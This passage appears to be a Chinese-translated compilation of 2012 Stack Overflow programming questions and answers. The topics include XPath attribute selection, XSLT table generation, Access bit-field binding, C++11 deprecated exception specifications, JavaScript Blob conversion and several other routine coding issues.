如您所见，字段名称是作为字符串传递的，并且可以使用 *display_as* 方法更改表头。因此，您可以使用简单的选择将**变量设置为要使用的字段名称，然后将该变量传递给 GroceryCRUD**：

```
 $lang = 'EN';
        $description= 'Product Description';
        $crud->columns('id', $lang, 'Price')
            ->display_as($lang, $description); 
```

# java - Mule 中的 XML XSD 验证和路由

> ID：13841531
> 
> 赞同：2
> 
> 时间：2012-12-12T14:05:05.560
> 
> 标签：java, xsd, mule, xsd-validation

我是 Mule 新手，但使用过其他有关集成的产品。

从文件入站端点收到 XML 后，我想根据 XSD 对其进行验证。如果验证失败，我想将其发送到 JMS/VM 队列，否则只需继续我的其他已经工作的流程。

我已经能够使用过滤器并且它按预期工作。那些不合规的人会被赶出网络空间。但我想处理这些并返回响应。

那么我还能采用什么其他方法呢？

是否有我可以使用的带有验证功能的 XML/XSD 路由器？

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T15:08:20.110

您可以将 xsd 过滤器包含到消息过滤器中，如本[博](http://blogs.mulesoft.org/integration-patterns-message-filter/)文中所述。通过这种方式，您将能够在过滤消息时采取一些其他措施。

我能想到的最简单的解决方案是抛出异常并从[catch-exception-strategy生成响应](http://www.mulesoft.org/documentation/display/MULE3USER/Catch+Exception+Strategy)

# c# - XPath 选择具有特定属性值的元素？

> ID：13841537
> 
> 赞同：4
> 
> 时间：2012-12-12T14:05:16.860
> 
> 标签：c#, xml, select, xpath

我在使用 XPath 选择节点时遇到问题。我将展示示例，由于真实文件中的大量数据而缩短了 xml 文件：

这是 XML 的子集：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<design xmlns="namespace_hidden" createddate="2012-12-07" createdby="User" name="New   Design">
  ...
  <variables>
  <measurements>
    <measurement name="Measurement001">
      <sample name="1">
        <position>[0,0]</position>
        <variables>
          <qualitative name="bId">
            <class>2193</class>
          </qualitative>
        </variables>
      </sample>
      ...
      <sample name="4">
        <position>[3,0]</position>
        <variables>
          <qualitative name="Q2">
            <class>V0</class>
          </qualitative>
          <qualitative name="Q3">
            <class>V2</class>
          </qualitative>
          <qualitative name="Q4">
            <class>V1</class>
          </qualitative>
          <quantitative name="Q5">
            <unit>Percent</unit>
            <value>8</value>
          </quantitative>
        </variables>
      </sample>
    </measurement>
    <measurement name="Measurement002">
        ..
    </measurement>
    ...
   </measurements>
</design> 
```

现在，我试图在特定测量下选择特定样本下的所有变量。

这是我使用的查询方法：

```
// Creating the navigator
var doc = new XPathDocument(xmlDoc[0]);
var navigator = doc.CreateNavigator();

// Creating the namespace manager:
XmlNamespaceManager nsMan = null;
if (navigator.NameTable != null) {
     nsMan = new XmlNamespaceManager(navigator.NameTable);
     nsMan.AddNamespace("y", xmlNs);
     nsMan.PushScope();
}

// Executing the query
var iterator = navigator.Select(string.Format("/y:design/y:measurements/y:measurement[name='{0}']/y:sample[name={1}]/y:variables/y:qualitative", currentMeasurement.Name, currentSample.Name), nsMan); 
```

当我使用这个查询时，我得到了第一个测量值和第一个样本，这样就可以了：

```
string.Format("/y:design/y:measurements/y:measurement[1]/y:sample[1]" 
```

但如果我使用这个查询：

```
"/y:design/y:measurements/y:measurement[name='Measurement001']/y:sample[1]" 
```

我没有得到任何结果

无奈之下，我也尝试了围绕属性值的不同组合，但没有成功。

我究竟做错了什么？

最好的问候，并感谢您的帮助！理查德

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T14:07:33.163

使用 at 符号`@`访问属性：

```
/y:design/y:measurements/y:measurement[@name='Measurement001']/y:sample[1]
                                       ^ 
```

# sql-server - 将复选框与 SQL Server 链接表中的位列绑定

> ID：13841539
> 
> 赞同：4
> 
> 时间：2012-12-12T14:05:24.937
> 
> 标签：sql-server, ms-access, ms-access-2010

我正在尝试将复选框与 SQL Server 链接表中的位列绑定。

起初我有一个关于类型的错误，然后我进入我的链接表访问并将列的显示控件更改为复选框而不是文本框。

现在保存记录时出现写入冲突错误。

![在此处输入图像描述](../Images/0b6c7100f23f47ea19d2962ced27ab96.png)

我尝试了在表中添加时间戳的解决方案，但我遇到了同样的问题

没有VBA可以吗？

谢谢

我的保存按钮的代码

```
Private Sub btnSave_Click()
  On Error GoTo Err_btnSave_Click
      DoCmd.DoMenuItem acFormBar, acRecordsMenu, acSaveRecord, , acMenuVer70
      DoCmd.Close
  Exit_btnSave_Click:
      Exit Sub

  Err_btnSave_Click:
      MsgBox Err.Description
      Resume Exit_btnSave_Click

End Sub 
```

我不认为那里有什么问题。仅当复选框绑定到位列时我才收到错误

我试图将文本框绑定到同一列。默认情况下该值为 false，如果我不更改值，则不会出现错误。

但是当表单很脏时，即使我更改了另一个控件的值，我也会收到错误消息。

我不明白。就像当有一个控件绑定到位列时，如果 Access 不理解只有一个用户。

上次我遇到这个问题时，我放弃了，我将类型更改为一个小的 int 但我很好奇。有没有办法让它变得有价值。我想要的只是一个布尔值。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-24T12:34:12.350

检查 SQL server 中的位域是否可以为空。如果是，则将其设为非 null 并将 SQL Server 中的默认值设置为 0 (false)。这里有一个关于可为空位字段的问题的讨论：[MS Access 链接表中的 Nullable bool fields](https://stackoverflow.com/questions/4764508/nullable-bool-fields-in-ms-access-linked-tables/4765810#4765810/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-02-23T07:49:32.833

链接到 Access 时的位字段，不能有 NULL 值。所以我们需要确保位字段的默认值是 0 或 1，这样当新记录添加到表中时，它将具有默认值而不是 NULL。这是因为 ODBC 驱动程序不知道位字段的 NULL 值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T15:36:28.630

> 一开始我有一个关于类型的错误......

这是你的第一个线索。回到 SQL Server 并确保您的位实际上是位。假设您必须更改数据库中的数据类型，您将需要重新链接到表或删除表并再次链接。

如果您无法更改 SQL Server 中列的数据类型，则可能需要使用 VBA。MS Access 2010 可能有一个向导，用于将复选框配置为文本数据类型字段。但是，如果数据库存储的值不是您配置的 2（希望不是更多），则很可能会发生坏事。

> 我进入我的链接表访问并将列的显示控件更改为复选框而不是文本框...

这与读/写无关。它只是在使用该列创建表单时确定默认控件。

# php - PHP - 从远程服务器复制图像时的大问题

> ID：13841543
> 
> 赞同：0
> 
> 时间：2012-12-12T14:05:45.487
> 
> 标签：php, copy

我想将图片从远程复制到我的服务器，但它有时会复制错误的图像。我尝试了几乎所有解决方案，但我将添加下面最简单的一个作为示例。

问题很奇怪。如果我从 curl 解析一个值为[http://www.domain.com/image.jpg](http://www.domain.com/image.jpg)的变量，然后我从中下载图像，那么我得到一个错误的图像。

1）这不起作用（ $image 的值是[http://www.domain.com/image.jpg](http://www.domain.com/image.jpg)）

```
//url of a picture
$image = $result->xpath('image-url');
$image = (string)$image[0];

copy($image, '/patch/image.jpg'); 
```

2）这有效 - 当我直接定义图像网址时。

```
//url of a picture pulled by curl
$image = $result->xpath('image-url');
$image = (string)$image[0];

if($image == 'http://www.domain.com/image.jpg') {

 $image = 'http://www.domain.com/image.jpg';
}

copy($image, '/patch/image.jpg'); 
```

在这两种情况下，$image 的值完全相同，但第一个有时会下载错误的图像，而第二个总是下载正确的图像。

你能帮忙吗？

```
 I have tried few variation:
 1) $img = file_get_contents('http://placehold.it/150x150');  - WORKS
 2) $img = file_get_contents('http://www.domain.com/image.jpg');  -WORKS
 3) $img = file_get_contents($image);   where  
 var_dump($image) = string(66) "http://www.domain.com/image.jpg"
 echo $image =   http://www.domain.com/image.jpg Doesn't work. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:09:21.687

这根本没有逻辑：

```
if($image == 'http://www.domain.com/image.jpg') {

 $image = 'http://www.domain.com/image.jpg';
} 
```

尝试这个：

```
$img = file_get_contents('http://placehold.it/150x150');
$fh = fopen('path/to/image/new', 'w+');
if (is_resource($fh)) {
    fwrite($fh, $img);
    fclose($fh);
} 
```

我不`copy()`用于这种情况。
更好地使用`file_get_contents()`或`curl`.

# javascript - 用作 javascript 代码的变量值

> ID：13841545
> 
> 赞同：0
> 
> 时间：2012-12-12T14:06:05.283
> 
> 标签：javascript

我有以下代码...

```
<script type="text/javascript">

var arr= new Array('10');

arr[0]='Need For Guru';
arr[1]='Qualities of a Guru';
arr[2]='Living Guru';
arr[3]='Who is a Satguru?';
arr[4]='Guru and Spiritual master';
arr[5]='Definition of discipleship';
arr[6]='Power of Faith';
arr[7]='Bad mouthing a Guru';
arr[8]='Fake Guru Shishya';
arr[9]='Pitfalls in the path of liberation';

var text='['+arr[0]+',\''+arr[1]+'\','+arr[2]+',\''+arr[3]+'\','+arr[4]+',\''+arr[5]+'\','+arr[6]+',\''+arr[7]+'\','+arr[8]+',\''+arr[9]+'\']';
document.write(text);

activatables('section', text );

</script> 
```

我的问题是我想将其用作 javascript 代码`value`的`text`一部分 --- `activatables('section', text );`.. 使代码如下所示

```
 activatables('section', ['Need For Guru','Qualities of a Guru',...]); 
```

但我不能做同样的事情......有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:14:15.507

我想我明白你在做什么......你想将数组序列化为文本，并将文本反序列化为一个新数组吗？

把它变成一个字符串...

```
var arr = ["Need for a Guru", "Qualities of a Guru" /*, etc... */ ];
var text = JSON.stringify(arr); 
```

要将字符串转换为数组...

```
var text = '["Need for a Guru", "Qualities of a Guru"]';
var arr = JSON.parse(text);
activatables('section', arr); 
```

显然，如果您已经可以访问源变量，则不需要反序列化/解析文本......您可以直接将其插入。

```
var arr = ["Need for a Guru", "Qualities of a Guru" /*, etc... */ ];
activatables('section', arr); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:08:30.370

你为什么做这个？如果您想要数组的字符串表示形式，请使用：

```
JSON.stringify(arr); 
```

可以使用以下方法作为参数传递：

```
activatables('section', JSON.stringify(arr) ); 
```

但是，在您的情况下，您似乎想将字符串`section`和数组*本身*作为参数传递给 function `activatables`。如果是这种情况，您需要做的就是：

```
activatables('section', arr ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:10:34.567

```
activatables('section', ['Need For Guru','Qualities of a Guru',...]); 
```

表示您将数组传递给`activatables`. 使用您当前的代码，您可以通过传递 来获得这种效果`arr`，这是您想要的数组：

```
activatables('section', arr); 
```

# javascript - 如何在ios中使用谷歌方向api？

> ID：13841550
> 
> 赞同：0
> 
> 时间：2012-12-12T14:06:18.560
> 
> 标签：javascript, ios, google-maps-api-3

我是 iOS 新手，我想使用 google api 指导服务，我在 google 文档中获得了 java 脚本，我也知道如何使用 UIWebView 在 iOS 中运行简单的 java 脚本，但仍然无法运行给出的脚本谷歌在以下链接：[https ://developers.google.com/maps/documentation/javascript/directions#TransitInformation](https://developers.google.com/maps/documentation/javascript/directions#TransitInformation)

我不需要使用 MapView，我只想访问信息。

```
<html>
<head>

<script type="text/javascript"

    var directionsDisplay;
    var directionsService = new google.maps.DirectionsService();
    var map;

    function initialize() {
        directionsDisplay = new google.maps.DirectionsRenderer();
        var chicago = new google.maps.LatLng(41.850033, -87.6500523);
        var mapOptions = {
            zoom:7,
            mapTypeId: google.maps.MapTypeId.ROADMAP,
            center: chicago
        }
        map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);
        directionsDisplay.setMap(map);
        directionsDisplay.setPanel(document.getElementById("directionsPanel"));
    };

    var root = function(diameter) {
        var start = document.getElementById("start").value;
        var end = document.getElementById("end").value;
        var request = {
            origin:start,
            destination:end,
            travelMode: google.maps.TravelMode.DRIVING
        };
        directionsService.route(request, function(response, status) {
                                if (status == google.maps.DirectionsStatus.OK) {
                                directionsDisplay.setDirections(response);
                                }
                                });

        return 100;
    };

</script>
</head>

<body>

</body>
</html> 
```

为了测试我只是返回一些值，但它没有给我输出，函数被调用，但挂在代码中的某个地方

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:37:46.240

1.  这与 iOS 无关。如果您正在构建一个 Web 应用程序，它应该在任何浏览器和任何操作系统中运行。

2 - 你说：

> 我不需要使用 MapView，我只想访问信息。

……但这是不允许的！如果您展示的是可公开访问的地图，您只能使用 Google 地图数据。请参阅[**TOS 的第 9.1 节**](https://developers.google.com/maps/terms#section_9_1)和第**10.1.1 (g)节[“没有 Google 地图，不得使用内容。](https://developers.google.com/maps/terms#section_10_1)** ”：

# sql - 在动态 SQL 中构建字符串 - 棘手的引号

> ID：13841551
> 
> 赞同：0
> 
> 时间：2012-12-12T14:06:29.293
> 
> 标签：sql, sql-server, quotes, dynamic-sql

我正在尝试为一些动态 SQL 构建自定义错误消息字符串。不包含在动态 SQL 中时看起来像这样：

```
SET @message = 'EXCEPTION: Msg ' + COALESCE(CAST(ERROR_NUMBER() AS NVARCHAR(20)), '[NULL]') + ', ' +
   'Level ' + COALESCE(CAST(ERROR_SEVERITY() AS NVARCHAR(20)), '[NULL]')  + ', ' +
   'State ' + COALESCE(CAST(ERROR_STATE() AS NVARCHAR(20)), '[NULL]') + ', ' +
   'Procedure ' + COALESCE(@PROCEDURE_NAME, '[NULL]') + ', ' +
   'Line ' + COALESCE(CAST(ERROR_LINE() AS NVARCHAR(20)), '[NULL]') + ', ' +
   'Message: ' + COALESCE(ERROR_MESSAGE(), '[NULL]') ; 
```

我在获取引号时遇到了麻烦，以便在动态 SQL 中执行它时看起来像这样。以下报价应如何排列：

```
EXEC @sql = 'BEGIN TRY
...
END TRY 
BEGIN CATCH 
DECLARE @PROCEDURE_NAME NVARCHAR(128);
SET @PROCEDURE_NAME = OBJECT_NAME(@@PROCID);

END CATCH
'; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:28:39.737

您的消息代码看起来不错。

但是，如果您想将 @message 嵌入动态 SQL 中，则必须将每个单引号加倍。

这是手工操作的痛苦。因此，我执行以下操作：

1.  像你所做的那样编写 SQL。
2.  选择它。
3.  键入 H（或从菜单中选择）。`'`在搜索框中放置一个单引号 ( `''`)，在替换为框中放置两个单引号 ( )。
4.  替换*选择*中的所有内容。

# javascript - 函数声明之间的区别

> ID：13841554
> 
> 赞同：3
> 
> 时间：2012-12-12T14:06:45.350
> 
> 标签：javascript, function, declaration

> **可能重复：**
> [JavaScript: var functionName = function() {} vs function functionName() {}](https://stackoverflow.com/questions/336859/javascript-var-functionname-function-vs-function-functionname)
> [这些声明（在 JavaScript 中）有什么区别？](https://stackoverflow.com/questions/2718842/whats-the-difference-in-those-declarations-in-javascript)

以下函数声明之间是否有任何区别：

```
function wtf() {

}

lol = function() {

}

omg: function() {

} 
```

?

问候

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:10:15.783

第一个：

在页面级别创建一个函数（你可以说是全局级别）

第二：将函数分配给变量'lol'

第三：语法错误。:P

完全类似于： [这些声明（在 JavaScript 中）有什么区别？](https://stackoverflow.com/questions/2718842/whats-the-difference-in-those-declarations-in-javascript)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T14:14:34.573

1- 是一个常规的函数声明。

2-您声明一个匿名函数并将其存储在一个变量中。

3- 最后一个是对象符号的一部分：

```
var obj = {
  omg:function(value){
    // some code here
  }
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:09:29.550

不，这对他们每个人来说都是一样的。

# c# - 创建迁移文件时如何为列分配不同的默认值

> ID：13841556
> 
> 赞同：3
> 
> 时间：2012-12-12T14:06:49.373
> 
> 标签：c#, migration, entity-framework-5

我想将现有列的值作为默认值分配给新添加的列。

在迁移文件中有：

```
 public override void Up()
    {
        AddColumn("dbo.Table1", "SecondName", c => c.String());
    }

    public override void Down()
    {
        DropColumn("dbo.Table1", "SecondName");
    } 
```

在此表中还有“FirstName”列。

如何将“FirstName”列的值分配给“SecondName”列作为默认值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-03T19:35:21.853

如果您只是重命名列`RenameColumn`应该适合您。

如果没有，您可以使用该`SQL`方法更新列值。在[本文](http://msdn.microsoft.com/en-us/data/jj591621.aspx)中没有内置的方式来查看数据移动。

# python - 对 for 循环的结果进行排序时保持值连接

> ID：13841557
> 
> 赞同：3
> 
> 时间：2012-12-12T14:06:56.190
> 
> 标签：python

在此代码的某些部分，我在保持与其对应的值相关联时遇到问题。我试图只打印出优先级最低的票证代码。我遇到的第一个问题是，当有人没有输入优先级时，它默认为“无”。因此，在我过滤掉之后，我想将剩余的数据放入一个列表中，然后从该列表中获取最小优先级并将其与票证代码一起打印。

数据集如下所示：

```
ticket    ticket code                 ticket priority
100_400   100_400 ticket description        None
100_400   100_400 ticket description         5
100_400   100_400 ticket description         1
100_400   100_400 ticket description         2
100_400   100_400 ticket description         4
100_400   100_400 ticket description         3 
```

所以目前这就是我的代码的样子：

```
result = set()   
for ticket in tickets:
# to get rid of the "None" priorities
    if ticket.priority != '<pirority range>':
        print ""
    else:
        #this is where i need help keeping the priority and the ticket.code together
        result.add(ticket.priority)

print min(result) 
print ticket.code 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:10:46.713

将整个添加`ticket`到您的`result`列表中，而不仅仅是优先级，然后实现您自己的`min`功能。此外，根据您的应用程序的其余部分，考虑使用与`set`结果不同的结构吗？

```
# this computes the minimum priority of a ticket
def ticketMin (list):
    min = list[0]
    for ticket in list:
        if (ticket.priority < min.priority):
            min = ticket
    return min

# changed set to list
result = list()   
for ticket in tickets:
# to get rid of the "None" priorities
    if ticket.priority != '<pirority range>':
        print ""
    else:
        #notice the change below
        result.append(ticket)

# changed 'min' to 'ticketMin'
minTicket = ticketMin(result)

print minTicket.priority
print minTicket.code 
```

或者，您可以节省几行代码并将内置函数与 Lambda 一起使用，如 Oscar 在评论中所示：

```
# changed set to list
result = list()   
for ticket in tickets:
# to get rid of the "None" priorities
    if ticket.priority != '<pirority range>':
        print ""
    else:
        #notice the change below
        result.append(ticket)

# Oscar's solution:
minTicket = min(result, key=lambda val : val.priority)

print minTicket.priority
print minTicket.code 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:11:37.250

将*票*添加到`result`集合中，而不是他们的优先级。然后在集合中找到优先级最低的票，如下所示：

```
minTicket = min(result, key=lambda x : x.priority) 
```

# c++ - C++11 中弃用的 throw-list

> ID：13841559
> 
> 赞同：48
> 
> 时间：2012-12-12T14:07:00.977
> 
> 标签：c++, c++11, throw

正如我在 [cppreference](http://en.cppreference.com/w/cpp/language#Functions)中看到的那样，经典的“抛出”声明列表现在在 C++11 中已弃用。离开这种机制的原因是什么，我应该如何指定哪些异常会引发我的功能？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-12-12T14:19:02.803

更详细的推理参见：[http ://www.open-std.org/jtc1/sc22/wg21/docs/papers/2010/n3051.html](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2010/n3051.html)

> 正如上述国家机构评论中所表达的那样，例外规范在实践中并未被证明是有用的。有很多关于 C++ 中异常规范问题的讨论（例如，参见 [Sutter02]、[Boost03]），但主要问题是：
> 
> *   运行时检查：C++ 异常规范是在运行时而不是在编译时检查的，因此它们不提供程序员保证所有异常都已被处理的保证。运行时故障模式（调用 std::unexpected()）不利于恢复。
> *   运行时开销：运行时检查需要编译器生成额外的代码，这也会妨碍优化。
> *   在泛型代码中不可用：在泛型代码中，通常不可能知道对模板参数的操作可能会引发哪些类型的异常，因此无法编写精确的异常规范。
> 
> 在实践中，只有两种形式的异常抛出保证是有用的：一个操作可能抛出一个异常（任何异常），或者一个操作永远不会抛出任何异常。前者通过完全省略异常规范来表达，而后者可以表达为 throw() 但出于性能考虑，很少使用。
> 
> [N3050] 引入了一种新的异常规范，noexcept，指定函数不会抛出任何异常。与 throw() 不同的是，noexcept 不需要编译器引入代码来检查是否抛出异常。相反，如果指定为 noexcept 的函数通过异常退出，结果是调用 std::terminate()。
> 
> 随着 noexcept 的引入，程序员现在可以表达两种在实践中有用的异常保证，而无需额外的开销。因此，本文建议弃用“动态”异常规范，即那些写为 throw(type-id-listopt) 的规范。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2017-03-11T21:59:19.313

彼得给出的答案并没有解决实现者和用户的异常规范的实际问题：

*   如果实现者未能坚持只抛出定义的异常的保证，异常规范会导致程序终止（或更准确地说是调用终止处理程序）。
*   因此，通过调用具有异常规范的方法，您作为库用户正在使您自己的代码**更**容易完全失败/终止。如果库函数内存不足（std::bad_alloc），您将没有机会捕获，但您将被终止。
*   因此，传达最可能的失败选项并要求您作为用户处理它们的最初目标没有实现。
*   作为另一方面的实现者，你不能真正调用任何其他没有异常规范的方法，因为这些可能会导致你终止调用者。一个可怕的地方。

结论是 C++ 应该像 Java 那样走：

*   如果你调用一个带有异常规范的方法并且你自己有一个异常规范，那么你必须捕获异常或者在你自己的异常规范中指定它。
*   编译器会强制执行此效果，但不会执行其他运行时效果。

Noexcept (C++11 起) 存在同样的概念错误，因为如果不遵守规范也会导致运行时终止，即声明不遵守的方法抛出。这使得`noexcept`不可能用于任何严重但包含最多的情况（[想到移动构造函数](http://www.open-std.org/JTC1/SC22/WG21/docs/papers/2009/n2855.html#problem "N2855 右值引用和异常安全")）。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-12T14:17:31.797

它们产生更慢和更大的代码，因为 libc++ 必须检查从函数传播的任何异常是否违反了它的异常规范并调用`std::unexpected`. 这几乎没有用，而且比仅仅记录一个函数自己抛出的异常更糟糕。

# xml - 使用 XSLT 匹配 XML 文档中的任何节点，即使我不知道节点的名称

> ID：13841561
> 
> 赞同：1
> 
> 时间：2012-12-12T14:07:13.287
> 
> 标签：xml, xslt, xpath

当我不知道节点的名称时，如何使用 XSTL 转换 XML 文档。所以基本上它应该适用于任何 XML 文档。

假设我得到了这个 XML 文档：

```
<?xml version="1.0"?>
<?xml-stylesheet href="transform.xsl" type="text/xsl" ?>
<!DOCTYPE cinema [
<!ELEMENT a (b*)>
<!ELEMENT b (c,d,e)>
<!ELEMENT c (#PCDATA)>
<!ELEMENT d (#PCDATA)>
<!ELEMENT e (#PCDATA)>
]>

<cinema>
<movie>
    <actor>Some actor</actor>
    <title>Some title</title>
    <year>Some year</year>
</movie>
</cinema> 
```

我将如何从中创建一个 HTML 表格？我知道我可以像这样匹配根元素：

```
<xsl:template match="/"> 
```

然后我选择所有这样的电影：

```
<xsl:for-each select="/*/*"> 
```

但是我怎么知道每部电影有一行，演员，标题和年份三列？特别是因为 XML 文件（电影）应该只能有 2 个孩子或 5 个孩子。

+++编辑+++

如果我这样做：

```
<tr>
    <td><xsl:value-of select="."/></td>
</tr> 
```

我将每部电影的详细信息排成一行。这几乎接近我想要实现的目标。但是我如何在该行的三列中展开电影细节？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:40:58.833

如果您知道您将始终具有三个级别的元素（根、子和孙），那么应该这样做：

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="html" />

  <xsl:template match="/">
    <html><body><xsl:apply-templates /></body></html>
  </xsl:template>

  <xsl:template match="/*">
    <table><xsl:apply-templates /></table>
  </xsl:template>

  <xsl:template match="/*/*">
    <tr><xsl:apply-templates /></tr>
  </xsl:template>

  <xsl:template match="/*/*/*">
    <td><xsl:apply-templates /></td>
  </xsl:template>
</xsl:stylesheet> 
```

`/`模板匹配*文档节点*，匹配文档节点的`/*`一级元素子节点（即文档的根元素），`/*/*`匹配二级子节点等。

`<xsl:apply-templates/>`（不带 no `select`）将匹配模板应用于当前节点的所有子节点，包括子元素、文本节点、注释和处理指令。因此，您可能需要将根模板

```
 <xsl:template match="/">
    <html><body><xsl:apply-templates select="*" /></body></html>
  </xsl:template> 
```

只选择子*元素*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:48:30.727

**示例 XML：**

```
<?xml version="1.0" encoding="utf-8"?>
<cinema>
  <movie>
    <actor>Some actor</actor>
    <title>Some title</title>
    <year>Some year</year>
  </movie>
  <movie>
    <actor>Someother actor</actor>
    <title>Someother title</title>
    <year>Someother year</year>
  </movie>
</cinema> 
```

**XSLT：**

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="xml" indent="yes"/>

    <xsl:template match="/">
      <table>
        <xsl:for-each select="*/*">
          <xsl:if test="position()=1">
            <tr>
              <th>actor</th>
              <th>title</th>
              <th>year</th>
            </tr>
          </xsl:if>
          <tr>
            <xsl:for-each select="actor|title|year">
              <td>
                <xsl:value-of select="."/>
              </td>
            </xsl:for-each>
          </tr>
        </xsl:for-each>
      </table>
    </xsl:template>
</xsl:stylesheet> 
```

**输出：**

```
<?xml version="1.0" encoding="utf-8"?>
<table>
  <tr>
    <th>actor</th>
    <th>title</th>
    <th>year</th>
  </tr>
  <tr>
    <td>Some actor</td>
    <td>Some title</td>
    <td>Some year</td>
  </tr>
  <tr>
    <td>Someother actor</td>
    <td>Someother title</td>
    <td>Someother year</td>
  </tr>
</table> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:14:50.737

**使用**：

```
<xsl:template match="movie">
 <!-- Specify your tr-producing code here -->
</xsl:template> 
```

# javascript - 数据：Blob 的 URL - 铬问题

> ID：13841562
> 
> 赞同：1
> 
> 时间：2012-12-12T14:07:15.080
> 
> 标签：javascript, chromium

几个小时以来，我一直在纠结一个问题，这个问题在这里被问了几次：我有来自闪存录音机的二进制数据，我将其转换为 dataURL，然后想转换为 blob 以进行上传. SO给了我几个答案，基本上都是一样的：

*   [来自 DataURL 的 Blob？](https://stackoverflow.com/questions/12168909/blob-from-dataurl)
*   [如何在javascript中将dataURL转换为文件对象？](https://stackoverflow.com/questions/6850276/how-to-convert-dataurl-to-file-object-in-javascript)
*   [将数据 URI 转换为文件，然后附加到 FormData](https://stackoverflow.com/questions/4998908/convert-data-uri-to-file-then-append-to-formdata)

我根据上面写了下面的代码

```
var data = window.atob(dataURL.split(',')[1]);
var length = data.length;
var uInt8Array = new Uint8Array(length);
for (var i = 0; i < length; ++i) {
    uInt8Array[i] = data.charCodeAt(i);
}
var myfile = new Blob([uInt8Array], {'type': 'audio/x-wav'}); 
```

这在 firefox nightly (20) 和 chrome 25 中完美运行，但 chromium 20 一直告诉我 myfile 的大小是 19 字节（当它应该是几个 kb 时），随后的上传始终失败。这是铬中的一个错误，还是我错过了一个说它还不支持的文档？有什么替代的想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T13:29:06.597

`Blob()`当使用某些参数调用时，铬的构造函数中似乎存在错误。我缩小了[jsfiddle 上](http://jsfiddle.net/LaurentS/ehS5L/)的问题（在 chromium 中运行以查看问题，其他浏览器似乎可以正确处理它，两个 blob 大小都应该是 32）

这是我为解决它而放在一起的代码：

```
var data = window.atob(dataURL.split(',')[1]);
var length = data.length;
var buffer = new ArrayBuffer(length);   // added this line
var uInt8Array = new Uint8Array(buffer);
for (var i = 0; i < length; ++i) {
    uInt8Array[i] = data.charCodeAt(i);
}
// two options here:
// buggy: produces a 19byte long file in chromium
var myfile = new Blob([uInt8Array], {'type': 'audio/x-wav'});
// works in chromium (and firefox), but produces a deprecation warning in chrome
var myfile = new Blob([buffer], {'type': 'audio/x-wav'}); 
```

我最终运行了第一个替代方案，然后`if (myfile.size == 19) {`在需要时获得第二个替代方案

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-23T01:46:17.607

使用我的代码将 dataURI 转换为 blob。

```
function dataURLtoBlob(dataURL) {
    var arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--){
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], {type:mime});
} 
```

# symfony - 关于 Symfony 测试用例

> ID：13841568
> 
> 赞同：0
> 
> 时间：2012-12-12T14:07:27.513
> 
> 标签：symfony, testcase

在 Symfony2 中，每个包都提供一个名为 Tests 的文件夹。任何机构都可以解释如何处理这些案例。我尝试了以下链接，但没有成功。

[测试](http://symfony.com/doc/2.0/book/testing.html)和 [运行 Symfony2 测试](http://symfony.com/doc/current/contributing/code/tests.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:18:13.857

`phpunit -c app/`在 Symfony 安装的根目录下运行将运行 src/ 目录中的 Bundles 的所有测试。

如果您想运行特定 Bundle 的测试，则可以从您的应用程序根目录使用

```
phpunit -c app/ path/to/Tests 
```

# performance - 比较 OpenCL 和 CUDA 程序的参数

> ID：13841569
> 
> 赞同：2
> 
> 时间：2012-12-12T14:07:27.687
> 
> 标签：performance, cuda, profiling, opencl

我用 CUDA 和 OpenCL 编写了一个科学程序。我要做的就是将这些程序的运行时性能进行比较。在分析性能比较时我应该考虑哪些参数？花费的时间是参数之一。其他是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T15:44:09.593

我认为有用的一些指标是

1.  **占用率**- 您需要确保所有目标部署平台（GPU、CPU 和/或实施）的占用率最大化。
2.  **吞吐量**- 您可以使用修改过的内核来计算最大计算吞吐量，该内核将任何延迟归零，从而使您的内核受计算限制。
3.  **延迟**- 再次 - 调整你的内核以执行（很少到）不计算并测试性能。这将表明正在访问的各种内存如何影响您的内核及其性能。

我猜，任何其他参数都可能取决于您的应用程序的决策因素。例如，它如何扩展将与问题相关 - 您的应用程序是否需要扩展？等等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T15:30:24.397

